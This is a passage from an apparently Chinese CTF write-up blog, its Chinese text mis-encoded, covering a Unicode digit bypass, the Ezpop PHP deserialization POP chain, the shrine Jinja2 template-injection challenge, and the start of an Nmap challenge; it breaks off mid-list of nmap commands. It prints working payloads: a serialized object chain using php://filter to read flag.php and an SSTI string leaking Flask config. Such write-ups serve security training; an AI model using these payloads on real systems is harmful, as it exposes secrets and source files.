alt="image-20230408200457185"></p><p>å¯ä»¥çœ‹åˆ°åœ¨charset=â€utf-8â€åé¢æœ‰æç¤ºï¼Œè¿™é‡Œéå¸¸é‡è¦ã€‚</p><p>ä½†æ˜¯å¾ˆå¤šçš„ç½‘ç«™éƒ½æ˜¯utf-8ç¼–ç ï¼Œä¸ºä»€ä¹ˆä¼šè¯´è¿™é‡Œå¾ˆé‡è¦?</p><p>å›åˆ°è´­ä¹°ç•Œé¢ï¼Œæˆ‘ä»¬è¾“å…¥å…¶ä»–çš„ä»·æ ¼ï¼Œå‘ç°è¾“å…¥10çš„æ—¶å€™æœ‰æç¤º</p><p><img src="../images/image-20230408200520327.png" alt="image-20230408200520327"></p><p>å‘Šè¯‰äº†æˆ‘ä»¬åªèƒ½ä½¿ç”¨ä¸€ä¸ªå­—ç¬¦ï¼Œä¸€ä¸ªå­—ç¬¦èƒ½å¤Ÿè´­ä¹°çš„å°±åªæœ‰å‰ä¸‰åªç‹¬è§’å…½ï¼Œè™½ç„¶æˆ‘ä¹Ÿæ²¡æœ‰è´­ä¹°æˆåŠŸhhh</p><p>æ‰€ä»¥çŒœæµ‹åªè¦è´­ä¹°äº†ç¬¬å››åªç‹¬è§’å…½ï¼Œå°±èƒ½è·å–flagï¼Œäºæ˜¯æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦æ¯”1337å¤§çš„æ•°å­—</p><p><strong>ä¹Ÿå°±æ˜¯utf-8ç¼–ç çš„è½¬æ¢å®‰å…¨é—®é¢˜</strong></p><p><a href="https://xz.aliyun.com/t/5402#toc-8">æµ…è°ˆUnicodeè®¾è®¡çš„å®‰å…¨æ€§</a></p><p><a href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicodeç­‰ä»·æ€§æµ…è°ˆ</a></p><p>å°±æ˜¯å¯ä»¥é€šè¿‡ä¸€äº›ç›¸åŒå«ä¹‰çš„æ•°å­—ä½†ä¸åŒæ ·å­çš„æ•°å­—æˆ–è€…å­—æ¯å¯ä»¥ç”¨æ¥ç»•è¿‡è¿‡æ»¤</p><p><img src="../images/image-20230408201042425.png" alt="image-20230408201042425"></p><p>å®ƒå’Œè‹±æ–‡å­—æ¯aéƒ½èƒ½è®¿é—®baidu.com</p><p>æ‰€ä»¥è¯´åœ¨è¿‡æ»¤açš„æ—¶å€™å¯ä»¥ç”¨å®ƒæ¥è¿›è¡Œç»•è¿‡</p><p>è¿™é‡Œè§£é¢˜çš„å…³é”®å°±æ˜¯æ‰¾ä¸€ä¸ªå•ä¸ªå­—ç¬¦æ˜¯å¤§äº1337çš„</p><p>è¿™é‡Œå°±å¾—ç”¨åˆ°ä¸€ä¸ªç½‘ç«™äº†</p><p><a href="https://www.compart.com/en/unicode/U+10123">unicode</a>    </p><p><img src="../images/image-20230408201802214.png" alt="image-20230408201802214"></p><p>ç„¶åéšä¾¿ç‚¹ä¸€ä¸ªå¤§äº1337çš„å°±è¡Œäº†</p><p><img src="../images/image-20230408201842658.png" alt="image-20230408201842658"></p><p>ç„¶åå°†0xæ¢æˆ%è¿›è¡Œä¼ å‚å°±å¥½äº†</p><p>å…¶å®ä¸­æ–‡çš„ä¸‡ä¹Ÿè¡Œ   äº¿ä¹Ÿè¡Œ</p><h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªpopé“¾çš„æ„é€ </p><p><strong>æ€è·¯</strong></p><p>å…ˆçœ‹ä¸€ä¸‹Modifierç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$value</span>);<span class="comment">//è¿™é‡Œçš„includeå‡½æ•°ï¼Œå¯ä»¥è®©æˆ‘ä»¬æ¥è¿›è¡Œphpä¼ªåè®®ï¼Œè¿™é‡Œæ˜¯ç¬¬ä¸€ä¸ªçªç ´å£ã€‚</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;<span class="comment">//è°ƒç”¨å‡½æ•°çš„æ–¹å¼è°ƒç”¨ä¸€ä¸ªå¯¹è±¡æ—¶çš„å›åº”æ–¹æ³•</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">append</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨includeæ¥ä¼ å…¥ä¸€ä¸ªphpä¼ªåè®®æ¥è®¿é—®flag.phpï¼Œç„¶åé€šè¿‡ä¸€ç³»åˆ—çš„æ–¹æ³•æ¥è¿›è¡Œè°ƒç”¨ã€‚</p><p>_invokeå‡½æ•°è¢«è°ƒç”¨æ—¶ä¼šè§¦å‘includeå‡½æ•°ã€‚</p><p>è¿™é‡Œçš„includeå‡½æ•°æ˜¯è§¦å‘æ¼æ´çš„æœ€åä¸€æ­¥ã€‚</p><p>é‚£ä¹ˆå¦‚ä½•è°ƒç”¨invokeå‘¢ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹Testç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰_get()é­”æœ¯æ–¹æ³•ã€‚</p><p>è¿™é‡Œç›´æ¥å°†t h i s âˆ’ &gt; p è¿› è¡Œ äº† è°ƒ ç”¨ ã€‚ è¿™ é‡Œ å°† this-&gt;pè¿›è¡Œäº†è°ƒç”¨ã€‚è¿™é‡Œå°†thisâˆ’&gt;pè¿›è¡Œäº†è°ƒç”¨ã€‚è¿™é‡Œå°†this-&gt;pè®¾ä¸ºä¸€ä¸ªæ„é€ å¥½çš„Modifierå¯¹è±¡ã€‚</p><p>ç„¶ååœ¨çœ‹showç±»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span>=<span class="string">&#x27;index.php&#x27;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;Welcome to &#x27;</span>.<span class="variable language_">$this</span>-&gt;source.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;<span class="comment">//åœ¨ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ï¼Œå½“echoä¸€ä¸ªå¯¹è±¡æ—¶ä¼šè‡ªåŠ¨è§¦å‘è¿™ä¸ªæ–¹æ³•ã€‚</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;<span class="comment">//ä½¿ç”¨äº†é»‘åå•è¿‡æ»¤äº†ä¸€ä¸‹httpåè®®çš„ä¸œè¥¿ï¼Œä½†æ˜¯ä¸å½±å“å’±ä»¬çš„phpä¼ªåè®®ã€‚</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>showç±»ä¸­çš„__construct()é­”æœ¯æ–¹æ³•</p><p>åˆ›å»ºæ–°å¯¹è±¡çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨è¿™ä¸ªæ–¹æ³•</p><p>ä¸»è¦åˆ©ç”¨__toString() è¿™ä¸ªé­”æœ¯æ–¹æ³•</p><p>åœ¨ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è°ƒç”¨ï¼Œå½“echoä¸€ä¸ªå¯¹è±¡æ—¶ä¼šè‡ªåŠ¨è§¦å‘è¿™ä¸ªæ–¹æ³•ã€‚è¿”å›äº†$this-&gt;str-&gt;source;</p><p>æ‰€ä»¥è¦echo include()é‡Œçš„å†…å®¹</p><p>çš„è®©sourceç­‰äºä¸€ä¸ªå¯¹è±¡<br><strong>æœ€ç»ˆæ€è·¯</strong></p><p>å‘popä¼ å€¼â†’è§¦å‘unserializeå‡½æ•°â†’è§¦å‘<code>__wakeup</code>â†’è§¦å‘å¯¹è±¡å½“ä½œå­—ç¬¦ä¸²ç”¨â†’è§¦å‘<code>__toString</code>â†’è§¦å‘è°ƒç”¨ä¸å¯è¯»å–å±æ€§â†’è§¦å‘<code>__get</code>â†’è§¦å‘å¯¹è±¡å½“ä½œå‡½æ•°ä½¿ç”¨â†’è§¦å‘<code>__invoke</code>â†’è°ƒç”¨appendï¼Œappendé‡Œæœ‰includeæ–‡ä»¶åŒ…å«</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123; </span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$var</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$source</span>; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$str</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> <span class="variable">$p</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;source=<span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str=<span class="keyword">new</span> <span class="title class_">Test</span>(); </span><br><span class="line"><span class="variable">$a</span>-&gt;source-&gt;str-&gt;p=<span class="keyword">new</span> <span class="title class_">Modifier</span>(); </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><p>é¢˜ç›®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>):</span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ˜¯ä¸€é“ssti   jnjia2æ¨¡æ¿çš„è€ƒé¢˜</p><p>æˆ‘ä»¬æŸ¥çœ‹æºç ï¼Œå¯ä»¥çŸ¥é“æˆ‘ä»¬æäº¤çš„å‚æ•°ä¹‹ä¸­çš„<code>()</code>ä¼šè¢«ç½®ä¸ºç©ºï¼ŒåŒæ—¶ä¼šå°†é»‘åå•å†…çš„å†…å®¹éå†ä¸€éï¼ŒæŠŠå‚æ•°å†…çš„ä¸é»‘åå•ç›¸åŒçš„ç½®ä¸º<code>None</code></p><p>å¦‚æœæ²¡æœ‰é»‘åå•çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>config</code>ï¼Œä¼ å…¥ <code>config</code>ï¼Œæˆ–è€…ä½¿ç”¨<code>self</code>ï¼Œä¼ å…¥ <code>&#123;&#123;self.__dict__&#125;&#125;</code></p><p>å½“<code>config</code>,<code>self</code>,<code>()</code>éƒ½è¢«è¿‡æ»¤çš„æ—¶å€™ï¼Œä¸ºäº†è·å–è®¯æ¯ï¼Œæˆ‘ä»¬éœ€è¦è¯»å–ä¸€äº›ä¾‹å¦‚<code>current_app</code>è¿™æ ·çš„å…¨å±€å˜é‡ã€‚</p><p>çœ‹äº†å…¶ä»–å¸ˆå‚…çš„WPï¼Œpythonçš„æ²™ç®±é€ƒé€¸è¿™é‡Œçš„æ–¹æ³•æ˜¯<code>åˆ©ç”¨pythonå¯¹è±¡ä¹‹é—´çš„å¼•ç”¨å…³ç³»æ¥è°ƒç”¨è¢«ç¦ç”¨çš„å‡½æ•°å¯¹è±¡</code>ã€‚</p><p>è¿™é‡Œæœ‰ä¸¤ä¸ªå‡½æ•°åŒ…å«äº†<code>current_app</code>å…¨å±€å˜é‡ï¼Œ<code>url_for</code>å’Œ<code>get_flashed_messages</code></p><p>è¿™é‡Œå’Œå¸¸è§„çš„sstiä¸åŒçš„åœ°æ–¹åœ¨äº  è¿™é‡Œæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•æ˜¯</p><p><code>return flask.render_template_string(safe_jinja(shrine))</code></p><p>å¸¸è§„çš„æ˜¯<code>eval()</code></p><p><img src="../images/image-20230408210526834.png" alt="image-20230408210526834"></p><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h2><p>é¢˜ç›®</p><p><img src="../images/image-20230408211012509.png" alt="image-20230408211012509"></p><p>å…ˆæŠ“ä¸ªåŒ…çœ‹ä¸€ä¸‹è¿è¡Œæµç¨‹ï¼Œé¦–å…ˆindex.phpç”¨äº†POSTä¼ å‚ä¼ è¿‡å»ä¸€ä¸ªhostå‚æ•°ï¼Œç„¶åæœ¬åœ°åˆå‘èµ·äº†ä¸€ä¸ªGETè¯·æ±‚ï¼Œä¼ äº†ä¸€ä¸ªå‚æ•°f=90131ï¼Œé€šè¿‡ä¿®æ”¹æ­¤å‚æ•°ï¼Œå‘ç°PHPæŠ¥é”™ simplexml_load_file(): I/O warning : failed to load external entity â€œxml/90132â€ in <strong>/var/www/html/result.php</strong> on line <strong>23</strong></p><p>simplexml_load_file() å‡½æ•°æ˜¯æŠŠ XML æ–‡æ¡£è½½å…¥å¯¹è±¡ä¸­ï¼Œæ‰€ä»¥åˆæ­¥çŒœæƒ³ï¼Œåº”è¯¥æ˜¯nmapå°†æ‰«æçš„ç»“æœä¿å­˜ä¸ºäº†xmlæ–‡æ¡£ï¼Œç„¶åPHPå†æ‰“å¼€è¯¥æ–‡æ¡£è§£æï¼Œåå°å‘½ä»¤å¯èƒ½ä¸ºnmap -oX 127.0.0.1 ./xml/????</p><p>è¿™é‡Œå°±éœ€è¦ç¨å¾®äº†è§£ä¸€ä¸‹nmapçš„æŒ‡ä»¤äº†ï¼Œç¨å¾®åœ¨ç½‘ä¸Šæ”¶é›†äº†ä¸€äº›å¸¸ç”¨å‘½ä»¤ï¼Œä»¥ä¾¿åé¢æŸ¥é˜…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">nmap -v 127.0.0.1ç»™å‡ºäº†è¿œç¨‹æœºå™¨æ›´è¯¦ç»†çš„ä¿¡æ¯ï¼Œæ˜¾ç¤ºå†—ä½™ä¿¡æ¯(æ‰«æç»†èŠ‚)</span><br><span class="line">nmap -iL nmaptest.txt è¿è¡Œå¸¦â€œiLâ€ é€‰é¡¹çš„nmapå‘½ä»¤æ¥æ‰«ææ–‡ä»¶ä¸­åˆ—å‡ºçš„æ‰€æœ‰IPåœ°å€</span><br><span class="line">nmap 192.168.0.* --exclude 192.168.0.100ä½¿ç”¨â€œ-excludeâ€é€‰é¡¹æ¥æ’é™¤æŸäº›ä½ ä¸æƒ³è¦æ‰«æçš„ä¸»æœº</span><br><span class="line">nmap -A 192.168.0.101å¯ç”¨æ“ä½œç³»ç»Ÿå’Œç‰ˆæœ¬æ£€æµ‹ï¼Œè„šæœ¬æ‰«æå’Œè·¯ç”±è·Ÿè¸ªåŠŸèƒ½</span><br><span class="line">nmap -O 127.0.0.1ä½¿ç”¨é€‰é¡¹â€œ-Oâ€å’Œâ€œ-osscan-guessâ€ä¹Ÿå¸®åŠ©æ¢æµ‹æ“ä½œç³»ç»Ÿä¿¡æ¯</span><br><span class="line">nmap -sA 192.168.0.101æ‰«æè¿œç¨‹ä¸»æœºä»¥æ¢æµ‹è¯¥ä¸»æœºæ˜¯å¦ä½¿ç”¨äº†åŒ…è¿‡æ»¤å™¨æˆ–é˜²ç«å¢™</span><br><span class="line">nmap -PN 192.168.0.101æ‰«æä¸»æœºæ£€æµ‹å…¶æ˜¯å¦å—åˆ°æ•°æ®åŒ…è¿‡æ»¤è½¯ä»¶æˆ–é˜²ç«å¢™çš„ä¿æŠ¤</span><br><span class="line">nmap -sP 192.168.0.*æ‰¾å‡ºç½‘ç»œä¸­çš„åœ¨çº¿ä¸»æœº</span><br><span class="line">nmap -F 